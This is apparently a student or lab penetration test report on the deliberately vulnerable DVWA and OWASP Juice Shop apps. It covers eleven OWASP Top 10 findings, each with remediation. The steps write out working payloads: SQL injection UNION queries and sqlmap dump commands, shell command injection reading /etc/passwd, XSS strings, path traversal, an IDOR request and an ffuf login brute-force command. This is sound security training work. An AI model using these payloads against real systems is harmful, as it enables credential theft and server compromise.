# Web Application Security Assessment
## OWASP Top 10 — Penetration Test Report

**Assessor:** Wai Lin Oo
**Date:** June 2026
**Targets:** DVWA (http://localhost), OWASP Juice Shop (http://localhost:3000)
**Classification:** CONFIDENTIAL
**Total Findings:** 11 (2 Critical, 4 High, 3 Medium, 2 Low)

---

## 1. Executive Summary

This report presents the findings of a web application security assessment conducted against two deliberately vulnerable web applications: DVWA (Damn Vulnerable Web Application) and OWASP Juice Shop. Both applications were deployed locally via Docker on Kali Linux and assessed manually using industry-standard tools including Burp Suite, SQLmap, Nikto, ffuf, and a custom Python fuzzer.

The assessment was structured around the OWASP Top 10 (2021) framework. A total of 11 vulnerabilities were identified across both applications, including two Critical-severity findings that would result in full database compromise and remote code execution in a real-world environment.

| Severity | Count | CVSS Range | OWASP Categories |
|---|---|---|---|
| Critical | 2 | 9.8 | A03, A02 |
| High | 4 | 6.1 – 7.5 | A01, A03 |
| Medium | 3 | 5.3 – 5.4 | A06, A07, A08 |
| Low | 2 | 3.7 | A05, A09 |
| **Total** | **11** | | |

Key observations:
- Both applications lack input sanitisation across all user-controlled parameters, enabling SQL Injection, Command Injection, and Cross-Site Scripting
- Passwords are stored as unsalted MD5 hashes — cracked instantly once extracted via SQL Injection
- No rate limiting or account lockout is implemented, enabling unrestricted brute force attacks
- Access control is not enforced server-side on API endpoints, enabling IDOR across user accounts
- No logging or alerting is present — all attacks completed without any defensive response

---

## 2. Scope and Methodology

### 2.1 Scope

| Application | URL | Version |
|---|---|---|
| DVWA | http://localhost | 1.10 |
| OWASP Juice Shop | http://localhost:3000 | 17.x |

Both applications were deployed via Docker. DVWA security level was set to Low throughout testing.

### 2.2 Methodology

Testing followed a structured manual approach aligned to the OWASP Testing Guide and covered all OWASP Top 10 (2021) categories. Phases:

1. **Reconnaissance** — Application mapping, endpoint discovery, technology fingerprinting via Nikto
2. **Automated scanning** — Nikto web scanner, SQLmap for SQL injection confirmation and data extraction
3. **Manual exploitation** — Burp Suite for request interception, manipulation, and replay
4. **Custom automation** — Python fuzzer (fuzzer.py) for automated payload testing across input fields
5. **Documentation** — All findings documented with CVSS v3.1 scores, evidence screenshots, and remediation guidance

**Issues encountered during testing:**
- Burp Suite did not intercept localhost traffic by default — resolved by removing localhost from Firefox "No proxy for" field
- Hydra failed against Juice Shop's JSON login API — switched to ffuf
- PHPSESSID expired frequently — session cookie refreshed between test phases

### 2.3 Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite Community | Proxy, intercept, Repeater — primary testing tool |
| SQLmap | Automated SQL injection confirmation and data extraction |
| Nikto v2.6.0 | Web server misconfiguration and vulnerability scanning |
| ffuf | JSON API credential brute forcing |
| fuzzer.py | Custom Python script — automated SQLi, XSS, CMDI, LFI, CSRF testing |
| CrackStation | Online MD5 hash cracking verification |
| Docker | Target application deployment |

---

## 3. Findings Summary

| ID | Title | App | Severity | CVSS | OWASP |
|---|---|---|---|---|---|
| F-01 | SQL Injection + MD5 Hash Cracking | DVWA | Critical | 9.8 | A03 / A02 |
| F-02 | Command Injection (RCE) | DVWA | Critical | 9.8 | A03 |
| F-03 | Reflected XSS | DVWA | High | 6.1 | A03 |
| F-04 | Stored XSS | DVWA | High | 7.4 | A03 |
| F-05 | Local File Inclusion | DVWA | High | 7.5 | A03 |
| F-06 | IDOR — User Account Enumeration | Juice Shop | High | 7.5 | A01 |
| F-07 | No Rate Limiting on Login | Juice Shop | Medium | 5.3 | A07 |
| F-08 | Missing CSRF Tokens | DVWA | Medium | 5.4 | A08 |
| F-09 | Outdated Server Components | DVWA | Medium | 5.3 | A06 |
| F-10 | Directory Indexing Enabled | DVWA | Low | 3.7 | A05 |
| F-11 | No Logging on Failed Logins | Juice Shop | Low | 3.7 | A09 |

---

## 4. Detailed Findings

---

### F-01 — SQL Injection + MD5 Hash Cracking
**Severity:** Critical | **CVSS:** 9.8 | **OWASP:** A03 Injection / A02 Cryptographic Failures | **App:** DVWA
**Endpoint:** `/vulnerabilities/sqli/?id=`

**Description:**
The User ID parameter is passed directly into a backend MySQL query without sanitisation or parameterisation. An attacker can inject arbitrary SQL statements to extract data from the database. Passwords are stored as unsalted MD5 hashes which are trivially cracked using precomputed rainbow tables or online tools. This finding covers both A03 (Injection) and A02 (Cryptographic Failures) as the two vulnerabilities chain directly — SQL Injection extracts the hashes, weak cryptography allows instant recovery of plaintext passwords.

**Steps to Reproduce:**

Step 1 — Confirm injection with tautology (pic01):
```sql
' OR 1=1-- -
```
Returns all user records — confirms the parameter is injectable.

Step 2 — Extract database name (pic02):
```sql
' UNION SELECT null,database()-- -
```
Response returns `dvwa` — confirms UNION-based injection and identifies the target database.

Step 3 — Dump all user credentials (pic03):
```sql
' UNION SELECT user,password FROM users-- -
```
Returns all 5 user accounts with MD5 password hashes:
- admin → `5f4dcc3b5aa765d61d8327deb882cf99`
- gordonb → `e99a18c428cb38d5f260853678922e03`
- 1337 → `8d3533d75ae2c3966d7e0d4fcc69216b`
- pablo → `0d107d09f5bbe40cade3de5c71e9e9b7`
- smithy → `5f4dcc3b5aa765d61d8327deb882cf99`

Step 4 — Crack MD5 hashes (pic04):
Hash `5f4dcc3b5aa765d61d8327deb882cf99` submitted to crackstation.net — cracked instantly as `password`. MD5 is not designed for password storage and is trivially reversed using precomputed rainbow tables.

Step 5 — Automated confirmation with SQLmap (pic05, pic06):
```bash
# Phase 1 — enumerate databases
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<id>;security=low" --dbs --batch
# Returns: dvwa, information_schema

# Phase 2 — dump users table with auto-crack
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<id>;security=low" -D dvwa -T users --dump --batch
# SQLmap auto-cracked all hashes:
# admin/smithy → password | gordonb → abc123 | 1337 → charley | pablo → letmein
```

**Evidence:** pic01 (OR injection), pic02 (database name), pic03 (credential dump), pic04 (CrackStation), pic05 (SQLmap db enum), pic06 (SQLmap dump + auto-crack)

**Impact:** Full database compromise. All user credentials extracted and cracked in plaintext. An attacker gains valid credentials for every account in the application. If file write privileges are granted, SQL Injection can also achieve Remote Code Execution via `INTO OUTFILE`.

**Remediation:**
- Use parameterised queries or prepared statements for all database interactions
- Replace MD5 with bcrypt, Argon2, or scrypt for password hashing
- Apply unique per-user salt to all password hashes
- Apply least privilege to database accounts — read-only where possible
- Deploy a Web Application Firewall

---

### F-02 — Command Injection (Remote Code Execution)
**Severity:** Critical | **CVSS:** 9.8 | **OWASP:** A03 Injection | **App:** DVWA
**Endpoint:** `/vulnerabilities/exec/`

**Description:**
The ping utility page passes user-supplied input directly to a system shell command without sanitisation. An attacker can append arbitrary OS commands using shell metacharacters, achieving Remote Code Execution in the context of the web server process (`www-data`).

**Steps to Reproduce (pic08):**
1. Navigate to `http://localhost/vulnerabilities/exec/`
2. Enter payload: `127.0.0.1; id`
3. Response includes: `uid=33(www-data)` — RCE confirmed
4. Escalate: `127.0.0.1; cat /etc/passwd` → full `/etc/passwd` file returned in browser

**Evidence:** pic08

**Impact:** Full server compromise. An attacker can read sensitive files, establish persistent reverse shells, and pivot to other internal systems. Running as `www-data` may allow further privilege escalation.

**Remediation:**
- Never pass user input to shell functions (`exec`, `system`, `shell_exec`)
- Use language-native libraries for network operations instead of system calls
- Implement strict input allowlisting (e.g. IP address regex only)
- Apply least-privilege to the web server process

---

### F-03 — Reflected XSS
**Severity:** High | **CVSS:** 6.1 | **OWASP:** A03 Injection | **App:** DVWA
**Endpoint:** `/vulnerabilities/xss_r/`

**Description:**
User input in the name parameter is reflected directly in the HTTP response without output encoding. An attacker can craft a malicious URL containing a script payload — when a victim clicks the link, the script executes in their browser in the context of the application.

**Steps to Reproduce:**

Payload 1 — script tag (pic09):
```html
<script>alert('XSS')</script>
```
Script executes immediately — alert box confirms reflected XSS.

Payload 2 — image tag bypass (pic10):
```html
<img src=x onerror=alert(1)>
```
Confirms XSS is not limited to script tags — image error handler also executes.

**Evidence:** pic09 (script tag), pic10 (img onerror bypass)

**Impact:** Session hijacking via cookie theft. Phishing via page content manipulation. Keylogging. Credential harvesting by redirecting victims to attacker-controlled pages.

**Remediation:**
- Output encode all user-supplied content before rendering in HTML
- Implement Content Security Policy (CSP) header
- Set HttpOnly flag on session cookies to prevent JavaScript access

---

### F-04 — Stored XSS
**Severity:** High | **CVSS:** 7.4 | **OWASP:** A03 Injection | **App:** DVWA
**Endpoint:** `/vulnerabilities/xss_s/`

**Description:**
The guestbook comment field stores user input in the database without sanitisation. Unlike Reflected XSS, the payload persists — it executes automatically for every user who visits the page, without requiring them to click a malicious link.

**Steps to Reproduce (pic11):**
1. Navigate to `http://localhost/vulnerabilities/xss_s/`
2. Enter in the message field: `<script>alert('XSS')</script>`
3. Submit — payload stored in database
4. Reload page — script executes automatically for every visitor

**Evidence:** pic11

**Impact:** More severe than Reflected XSS — no victim interaction required beyond visiting the page. Enables persistent session hijacking, credential theft, and malware delivery to all site visitors.

**Remediation:**
- Sanitise and output encode all stored user content before rendering
- Implement Content Security Policy (CSP)
- Apply input validation on the server side — reject or strip HTML tags

---

### F-05 — Local File Inclusion (LFI)
**Severity:** High | **CVSS:** 7.5 | **OWASP:** A03 Injection | **App:** DVWA
**Endpoint:** `/vulnerabilities/fi/?page=`

**Description:**
The `page` parameter accepts a file path without validation, allowing path traversal sequences (`../`) to navigate outside the web root and read arbitrary files from the server filesystem. The full contents of `/etc/passwd` are returned directly in the browser as shown in the screenshot.

**Steps to Reproduce (f05.png):**
1. Navigate to `http://localhost/vulnerabilities/fi/`
2. Modify the URL parameter to: `?page=../../../../../../etc/passwd`
3. Full `/etc/passwd` contents rendered at the top of the page — visible in both the URL bar and page response

**Evidence:** 20_dvwa_fi.png (URL bar shows payload, /etc/passwd contents visible at top of page)

**Impact:** Sensitive file disclosure. An attacker can read application configuration files, database credentials, SSH private keys, and source code. On PHP servers, LFI can be chained with log poisoning to achieve Remote Code Execution.

**Remediation:**
- Whitelist allowed file values — never use raw user input to construct file paths
- Disable `allow_url_include` in PHP configuration
- Apply `open_basedir` restriction to limit accessible directories
- Validate and sanitise all file path inputs server-side

---

### F-06 — IDOR — User Account Enumeration
**Severity:** High | **CVSS:** 7.5 | **OWASP:** A01 Broken Access Control | **App:** Juice Shop
**Endpoint:** `/api/Users/:id`

**Description:**
The `/api/Users/` endpoint returns full user account details — including email address, role, and profile data — when accessed with a sequential integer ID. The application does not verify that the requesting user owns or has permission to view the requested account. This is an Insecure Direct Object Reference (IDOR) — a user can access any other user's data simply by changing a number in the request.

**Steps to Reproduce:**
1. Log in to Juice Shop as any registered user
2. Add any item to your basket — this generates an authenticated session with a valid JWT token
3. In Burp Suite with Intercept ON, the basket POST request is captured
4. Right-click the intercepted request → **Send to Repeater**
5. In Repeater, manually change the request to:
```
GET /api/Users/2 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <your_token>
```
6. Click **Send**
7. Response returns **200 OK** with full account data for user ID 2:
```json
{
  "status": "success",
  "data": {
    "id": 2,
    "email": "jim@juice-sh.op",
    "role": "customer"
  }
}
```

The 200 OK confirms the server returned another user's private data without checking ownership. A properly secured API would return 403 Forbidden.

**Evidence:** Burp Repeater screenshot showing GET /api/Users/2 and 200 OK response with user data

**Impact:** Any authenticated user can enumerate all registered accounts by iterating the ID. Harvested email addresses are used directly for targeted brute force attacks — chained into F-07.

**Remediation:**
- Implement server-side authorisation checks on all object references
- Verify the requesting user's identity matches the requested resource
- Use non-sequential UUIDs instead of integer IDs
- Return 403 Forbidden for unauthorised access — never 404

---

### F-07 — No Rate Limiting on Login (Brute Force)
**Severity:** Medium | **CVSS:** 5.3 | **OWASP:** A07 Auth Failures | **App:** Juice Shop
**Endpoint:** `/rest/user/login`

**Description:**
The login endpoint applies no rate limiting, CAPTCHA, or account lockout policy. An attacker can send an unlimited number of authentication attempts without any throttling or blocking. The target email `jim@juice-sh.op` was identified through IDOR (F-06), demonstrating direct attack chaining between these two findings.

**Note on tooling:** Hydra was attempted first but failed — Juice Shop uses a JSON API for authentication rather than a standard HTML form, making Hydra's `http-post-form` module incompatible. ffuf was used instead as it supports custom JSON request bodies.

**Steps to Reproduce (pic15):**
```bash
ffuf -w small_wordlist.txt \
  -u http://localhost:3000/rest/user/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"jim@juice-sh.op","password":"FUZZ"}' \
  -mc 200
```
Password `ncc-1701` found — highlighted in pic15 showing 200 OK response. No lockout or throttling triggered at any point during the attack.

**Evidence:** pic15 (ffuf output with found password highlighted)

**Impact:** Any account can be brute forced given sufficient time. Chained with IDOR email enumeration (F-06), this enables targeted credential attacks against specific accounts.

**Remediation:**
- Implement rate limiting — maximum 5 attempts per minute per IP
- Apply account lockout after repeated failures
- Add CAPTCHA on repeated failures
- Alert on brute force patterns in application logs

---

### F-08 — Missing CSRF Tokens
**Severity:** Medium | **CVSS:** 5.4 | **OWASP:** A08 Software & Data Integrity Failures | **App:** DVWA
**Endpoint:** `/vulnerabilities/csrf/`

**Description:**
The password change form does not include a CSRF token and does not validate the Referer header. A malicious website can silently trigger a password change on behalf of an authenticated victim simply by having them visit a crafted page. Confirmed automatically via fuzzer.py which submitted the form without a token and received a 200 OK response.

**Evidence:** pic18 (fuzzer.py output showing `[VULN] CSRF likely -- form submitted without token, server returned 200`)

**Impact:** An attacker can change any authenticated user's password by tricking them into visiting a malicious page, leading to full account takeover.

**Remediation:**
- Implement per-session CSRF tokens on all state-changing forms
- Validate the Referer header as a secondary defence
- Use SameSite=Strict cookie attribute

---

### F-09 — Outdated Server Components
**Severity:** Medium | **CVSS:** 5.3 | **OWASP:** A06 Vulnerable Components | **App:** DVWA


**Description:**
Nikto identified Apache/2.4.25 running on the server. The current stable version is Apache 2.4.66. Outdated server components may contain known, publicly disclosed vulnerabilities with available exploits. Nikto also identified missing security headers and exposed default files.

Additional Nikto findings:
- Missing headers: `Content-Security-Policy`, `Strict-Transport-Security`, `Referrer-Policy`, `X-Content-Type-Options`
- Cookies set without `HttpOnly` flag — PHPSESSID exposed to JavaScript
- `.gitignore` publicly accessible — exposes directory structure
- Apache default file `/icons/README` accessible

**Evidence:** pic16 (Nikto scan — Apache/2.4.25 identified as outdated), pic17 (Juice Shop Nikto scan — JAMon CVE-2013-6235)

**Remediation:**
- Keep all server components updated to current stable versions
- Subscribe to CVE feeds for Apache and PHP
- Add all missing security response headers

---

### F-10 — Directory Indexing Enabled
**Severity:** Low | **CVSS:** 3.7 | **OWASP:** A05 Security Misconfiguration | **App:** DVWA


**Description:**
Directory indexing is enabled on `/config/`, making the directory contents browseable to any visitor. The listing exposes `config.inc.php` and `config.inc.php.dist` — files that contain database credentials, hostname, and application configuration. This path should never be accessible in any environment.

**Evidence:** pic19 (directory listing at http://localhost/config/ showing config.inc.php exposed)

**Steps to Reproduce:**
1. Navigate to `http://localhost/config/`
2. Directory listing displayed — `config.inc.php` and `config.inc.php.dist` visible

**Impact:** Exposure of database credentials and application configuration to unauthenticated users.

**Remediation:**
- Disable directory indexing in Apache config: `Options -Indexes`
- Restrict access to `/config/` via `.htaccess` or web server configuration
- Move sensitive configuration files outside the web root entirely

---

### F-11 — No Logging on Failed Logins
**Severity:** Low | **CVSS:** 3.7 | **OWASP:** A09 Security Logging & Monitoring Failures | **App:** Juice Shop

**Description:**
During brute force testing (F-07), hundreds of failed login attempts were sent against `jim@juice-sh.op` without triggering any alerts, lockouts, or visible defensive response. In a real deployment this means an ongoing attack would go entirely undetected until the attacker had already succeeded.

**Evidence:** pic15 — brute force completed successfully with no indication of detection or throttling

**Impact:** Attacks go undetected. No audit trail for incident response. No ability to identify compromised accounts until damage is done.

**Remediation:**
- Log all failed authentication attempts with timestamp, IP, and username
- Alert on repeated failures from the same IP or targeting the same account
- Integrate with a SIEM for centralised monitoring
- Implement a minimum log retention policy

---

## 5. Python Fuzzer Results

`fuzzer.py` was developed to automate payload testing across DVWA input fields, testing for SQLi, XSS, Command Injection, LFI, and CSRF automatically.

**Evidence:** pic18 (fuzzer terminal output)

| Type | Endpoint | Result |
|---|---|---|
| XSS | /vulnerabilities/xss_r/ | 4 payloads reflected — all vectors confirmed |
| LFI | /vulnerabilities/fi/ | Path traversal confirmed — /etc/passwd contents returned |
| CSRF | /vulnerabilities/csrf/ | Submission accepted without token — 200 OK |
| SQLi | /vulnerabilities/sqli/ | Confirmed manually via Burp and SQLmap (pic01-06) |
| CMDI | /vulnerabilities/exec/ | Confirmed manually via Burp (pic08) |

---

## 6. Nikto Scan Results

**Evidence:** pic16 (DVWA), pic17 (Juice Shop)

### DVWA (http://localhost)
- Apache/2.4.25 outdated — current is 2.4.66 (A06)
- Cookies PHPSESSID and security set without HttpOnly flag (A05)
- Missing headers: CSP, HSTS, Referrer-Policy, X-Content-Type-Options (A05)
- Directory indexing enabled on /config/ and /docs/ (A05)
- .gitignore publicly accessible (A05)
- Apache default file /icons/README accessible (A05)

### Juice Shop (http://localhost:3000)
- Missing security headers: CSP, HSTS, Referrer-Policy, Permissions-Policy (A05)
- Sensitive files exposed: /users.json, /PasswordsData.json, /accounts.json (A05)
- JAMon Admin interface identified — CVE-2013-6235 XSS vulnerability (A06)
- .bash_history and .sh_history accessible (A05)

---

## 7. OWASP Top 10 Coverage

| Category | Status | Finding(s) |
|---|---|---|
| A01 Broken Access Control | Confirmed | F-06 |
| A02 Cryptographic Failures | Confirmed | F-01 (chained) |
| A03 Injection | Confirmed | F-01, F-02, F-03, F-04, F-05 |
| A04 Insecure Design | Observed | Architecture-level |
| A05 Security Misconfiguration | Confirmed | F-10 + Nikto findings |
| A06 Vulnerable Components | Confirmed | F-09 |
| A07 Auth Failures | Confirmed | F-07 |
| A08 Integrity Failures | Confirmed | F-08 |
| A09 Logging Failures | Confirmed | F-11 |
| A10 SSRF | Tested | Endpoint identified on Juice Shop /profile/image/url — inconclusive |

---

## 8. Conclusion

Both DVWA and OWASP Juice Shop were assessed against the OWASP Top 10 (2021) framework. Confirmed vulnerabilities were found across 9 of 10 categories with 11 total findings including 2 Critical.

The most significant risk identified is the direct attack chain spanning multiple findings: IDOR (F-06) enabled email harvesting → targeted brute force (F-07) with no rate limiting → full account compromise. Separately, SQL Injection (F-01) enabled database extraction → MD5 hashes cracked instantly → all user passwords recovered in plaintext. These chains demonstrate that individual vulnerabilities compound significantly and that defence in depth is essential.

All testing was conducted in an isolated local Docker environment with no impact to any production systems.
